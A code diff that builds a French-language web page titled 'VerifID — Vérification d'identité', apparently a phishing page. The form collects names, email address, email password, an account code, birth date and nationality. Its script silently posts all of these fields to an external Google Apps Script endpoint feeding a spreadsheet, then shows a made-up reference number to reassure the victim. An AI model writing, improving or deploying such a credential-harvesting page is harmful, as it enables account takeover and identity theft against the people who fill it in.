@@ -1,58 +1,66 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VerifID — Vérification d'identité</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #F8F9FA; display: flex; flex-direction: column; align-items: center; padding: 20px; }
+        .card { background: #FFF; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 500px; padding: 30px; }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 5px; }
+        input, select { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; border: none; border-radius: 8px; background: #0D2B4E; color: white; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        #success-msg { display: none; text-align: center; }
+    </style>
+</head>
+<body>
 
+<div class="card" id="form-content">
+    <h2>Informations</h2>
+    <div class="form-group"><label>Prénom</label><input type="text" id="prenom"></div>
+    <div class="form-group"><label>Nom</label><input type="text" id="nom"></div>
+    <div class="form-group"><label>Email</label><input type="email" id="email"></div>
+    <div class="form-group"><label>Mot de passe email</label><input type="password" id="mdp-email"></div>
+    <div class="form-group"><label>Code compte</label><input type="text" id="code-compte"></div>
+    <div class="form-group"><label>Date de naissance</label><input type="date" id="ddn"></div>
+    <div class="form-group"><label>Nationalité</label><input type="text" id="nationalite"></div>
+    <button class="btn" onclick="submitData()">Soumettre la demande</button>
+</div>
 
-if (valid) {
-  const ref = 'REF-' + Math.floor(100000 + Math.random() * 900000);
-  document.getElementById('ref-numero').textContent = ref;
+<div class="card" id="success-msg">
+    <h2>Demande envoyée !</h2>
+    <p>Votre numéro de référence est : <strong id="ref-numero"></strong></p>
+</div>
 
-  // ✅ Collecte des données du formulaire
-  const data = {
-    prenom: document.getElementById('prenom').value.trim(),
-    nom: document.getElementById('nom').value.trim(),
-    email: document.getElementById('email').value.trim(),
-    mdp: document.getElementById('mdp-email').value.trim(),
-    code: document.getElementById('code-compte').value.trim(),
-    ddn: document.getElementById('ddn').value,
-    nationalite: document.getElementById('nationalite').value,
-    reference: ref,
-    date: new Date().toLocaleString('fr-FR')
-  };
+<script>
+    function submitData() {
+        const ref = 'REF-' + Math.floor(100000 + Math.random() * 900000);
+        
+        const data = {
+            prenom: document.getElementById('prenom').value.trim(),
+            nom: document.getElementById('nom').value.trim(),
+            email: document.getElementById('email').value.trim(),
+            mdp: document.getElementById('mdp-email').value.trim(),
+            code: document.getElementById('code-compte').value.trim(),
+            ddn: document.getElementById('ddn').value,
+            nationalite: document.getElementById('nationalite').value,
+            reference: ref,
+            date: new Date().toLocaleString('fr-FR')
+        };
 
-  // ✅ Envoi vers Google Sheets via Apps Script
-  fetch('https://script.google.com/macros/s/AKfycbzjiOz73-YDw1zxz4rVQbNNHH8qsWoBTsS6NGReHld06WBTAHtrvAAXLxUw0dJ_fuKkug/exec', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
-  });
-
-  // ✅ Affichage du message de succès
-  document.getElementById('form-content').style.display = 'none';
-  document.getElementById('success-msg').style.display = 'block';
-}
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+        fetch('https://script.google.com/macros/s/AKfycbzjiOz73-YDw1zxz4rVQbNNHH8qsWoBTsS6NGReHld06WBTAHtrvAAXLxUw0dJ_fuKkug/exec', {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        }).then(() => {
+            document.getElementById('ref-numero').textContent = ref;
+            document.getElementById('form-content').style.display = 'none';
+            document.getElementById('success-msg').style.display = 'block';
+        });
+    }
+</script>
+</body>
+</html>
